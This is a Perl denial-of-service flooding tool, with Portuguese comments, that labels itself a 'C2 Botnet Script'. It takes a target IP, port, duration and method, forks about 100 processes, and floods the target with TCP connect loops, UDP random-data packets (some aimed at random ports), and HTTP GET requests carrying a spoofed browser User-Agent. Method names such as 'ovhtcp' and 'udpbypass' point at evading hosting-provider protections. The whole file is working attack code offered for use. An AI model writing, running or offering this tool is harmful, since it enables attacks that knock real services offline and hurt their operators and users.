#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket::INET;
use Time::HiRes qw(time usleep); # Para tempo mais preciso
use Getopt::Long; # Para análise de argumentos de linha de comando

# Códigos de cores ANSI
my $RED_DARK = "\x1b[31;1m"; # Vermelho Escuro (Negrito)
my $RED_LIGHT = "\x1b[91m";  # Vermelho Claro
my $RESET = "\x1b[0m";       # Resetar cor

# --- Banner em ASCII ---
print "${RED_DARK}";
print "                                                                                              \n";
print "  __ __    ___   _ __  ___ ___  _ __   ___  ___  ___ ___ _ __ ___  _ __ ___ _ __   __ _  ___ \n";
print " / _` |  / _ \\ | '__|/ __/ _ \\| '_ \\ / __|/ _ \\/ __/ __| '__/ _ \\| '__/ _ \\ '__| / _` |/ __|\n";
print "| (_| | |  __/ | |  | (_| (_) | | | | (__| (_) \\__ \\__ \\ | | (_) | | |  __/ |    | (_| | (__ \n";
print " \\__,_|  \\___| |_|   \\___\\___/|_| |_|\\___|\\___/|___/___/_|  \\___/|_|  \\___|_|     \\__,_|\\___|\n";
print "                                                                                              \n";
print "                                     C2 Botnet Script                                         \n";
print "${RESET}\n";

# --- Variáveis Globais ---
my $target_ip = '';
my $target_port = 0;
my $duration = 0;
my $method = '';
my $threads = 100; # Threads padrão para inundação

# --- Análise de Argumentos ---
GetOptions(
    'ip=s'      => \$target_ip,
    'port=i'    => \$target_port,
    'time=i'    => \$duration,
    'method=s'  => \$method,
    'threads=i' => \$threads,
) or die "Uso: $0 --ip <ip_alvo> --port <porta_alvo> --time <segundos_duracao> --method <ovhtcp|tcpbypass|udpbypass|udpstomper|http|https> [--threads <num_threads>]\n";

unless ($target_ip && $target_port && $duration && $method) {
    die "Uso: $0 --ip <ip_alvo> --port <porta_alvo> --time <segundos_duracao> --method <ovhtcp|tcpbypass|udpbypass|udpstomper|http|https> [--threads <num_threads>]\n";
}

print "${RED_LIGHT}Iniciando ataque ${method} contra ${target_ip}:${target_port} por ${duration} segundos com ${threads} threads...${RESET}\n";

# --- Subrotinas de Ataque ---

sub ovh_tcp_attack {
    my ($ip, $port, $duration_sec) = @_;
    my $end_time = time() + $duration_sec;

    my $counter = 0;
    while (time() < $end_time) {
        my $sock = IO::Socket::INET->new(
            PeerAddr => $ip,
            PeerPort => $port,
            Proto    => 'tcp',
            Timeout  => 1, # Curto timeout para evitar travamento
        );
        if ($sock) {
            # Opcionalmente enviar alguns dados para manter a conexão aberta
            print $sock "GET / HTTP/1.1\r\nHost: $ip\r\n\r\n";
            close $sock;
            $counter++;
        }
    }
    print "${RED_LIGHT}OVH TCP Attack: ${counter} conexões abertas/fechadas.${RESET}\n";
}

sub tcp_bypass_attack {
    my ($ip, $port, $duration_sec) = @_;
    my $end_time = time() + $duration_sec;

    my $counter = 0;
    while (time() < $end_time) {
        my $sock = IO::Socket::INET->new(
            PeerAddr => $ip,
            PeerPort => $port,
            Proto    => 'tcp',
            Timeout  => 1,
            # Esta é uma tentativa de bypass simplificada. Um bypass verdadeiro exigiria sockets brutos e pacotes SYN.
            # Aqui, apenas abrimos e fechamos conexões rapidamente, potencialmente preenchendo a tabela de conexões do alvo.
        );
        if ($sock) {
            # Enviar dados mínimos para acionar uma resposta e fechar rapidamente
            print $sock "SYN\r\n"; # Simbólico, não um pacote SYN real
            close $sock;
            $counter++;
        }
    }
    print "${RED_LIGHT}TCP Bypass Attack: ${counter} conexões rápidas abertas/fechadas.${RESET}\n";
}

sub udp_bypass_attack {
    my ($ip, $port, $duration_sec) = @_;
    my $end_time = time() + $duration_sec;

    my $sock = IO::Socket::INET->new(
        Proto => 'udp',
    ) or die "Não foi possível criar socket UDP: $!\n";

    my $counter = 0;
    while (time() < $end_time) {
        my $data = generate_random_data(64); # Enviar 64 bytes de dados aleatórios
        $sock->send($data, 0, $ip, $port);
        $counter++;
    }
    print "${RED_LIGHT}UDP Bypass Attack: ${counter} pacotes UDP enviados.${RESET}\n";
}

sub udp_stomper_attack {
    my ($ip, $port, $duration_sec) = @_;
    my $end_time = time() + $duration_sec;

    my $sock = IO::Socket::INET->new(
        Proto => 'udp',
    ) or die "Não foi possível criar socket UDP: $!\n";

    my $counter = 0;
    while (time() < $end_time) {
        my $data = generate_random_data(rand(1024) + 64); # Tamanho de payload aleatório (64 a 1088 bytes)
        my $target_port_rand = int(rand(65535)) + 1; # Aleatorizar porta alvo
        $sock->send($data, 0, $ip, $target_port_rand);
        $counter++;
    }
    print "${RED_LIGHT}UDP Stomper Attack: ${counter} pacotes UDP com payload aleatório enviados para portas aleatórias.${RESET}\n";
}

sub http_attack {
    my ($ip, $port, $duration_sec, $path) = @_;
    $path = $path // '/'; # Caminho padrão

    my $end_time = time() + $duration_sec;
    my $request_line = "GET $path HTTP/1.1\r\nHost: $ip\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36\r\nConnection: Close\r\n\r\n";

    my $counter = 0;
    while (time() < $end_time) {
        my $sock = IO::Socket::INET->new(
            PeerAddr => $ip,
            PeerPort => $port,
            Proto    => 'tcp',
            Timeout  => 1,
        );
        if ($sock) {
            print $sock $request_line;
            close $sock;
            $counter++;
        }
    }
    print "${RED_LIGHT}HTTP Attack: ${counter} requisições HTTP enviadas.${RESET}\n";
}

sub https_attack {
    my ($ip, $port, $duration_sec, $path) = @_;
    $path = $path // '/'; # Caminho padrão

    print "${RED_LIGHT}HTTPS Attack: Esta funcionalidade requer o módulo Perl 'IO::Socket::SSL'.\n";
    print "Para instalar: perl -MCPAN -e 'install IO::Socket::SSL'\n";
    print "Simulando um ataque HTTP simples em vez de HTTPS.${RESET}\n";
    # Fallback para ataque HTTP para demonstração sem módulo SSL
    http_attack($ip, $port, $duration_sec, $path);
}

sub generate_random_data {
    my ($length) = @_;
    my @chars = ('a'..'z', 'A'..'Z', 0..9, '!', '@', '#', '$', '%', '^', '&', '*');
    my $data = '';
    for (1..$length) {
        $data .= $chars[rand @chars];
    }
    return $data;
}


# --- Execução Principal ---
my @pids;
for (1 .. $threads) {
    my $pid = fork();
    if ($pid == 0) {
        # Processo filho
        if ($method eq 'ovhtcp') {
            ovh_tcp_attack($target_ip, $target_port, $duration);
        } elsif ($method eq 'tcpbypass') {
            tcp_bypass_attack($target_ip, $target_port, $duration);
        } elsif ($method eq 'udpbypass') {
            udp_bypass_attack($target_ip, $target_port, $duration);
        } elsif ($method eq 'udpstomper') {
            udp_stomper_attack($target_ip, $target_port, $duration);
        } elsif ($method eq 'http') {
            http_attack($target_ip, $target_port, $duration, '/');
        } elsif ($method eq 'https') {
            https_attack($target_ip, $target_port, $duration, '/');
        } else {
            die "Método de ataque desconhecido: $method\n";
        }
        exit 0; # Filho sai
    } elsif ($pid > 0) {
        # Processo pai
        push @pids, $pid;
    } else {
        die "Não foi possível criar thread: $!\n";
    }
}

# Esperar todos os processos filhos terminarem
foreach my $pid (@pids) {
    waitpid($pid, 0);
}

print "${RED_LIGHT}Ataque finalizado.${RESET}\n";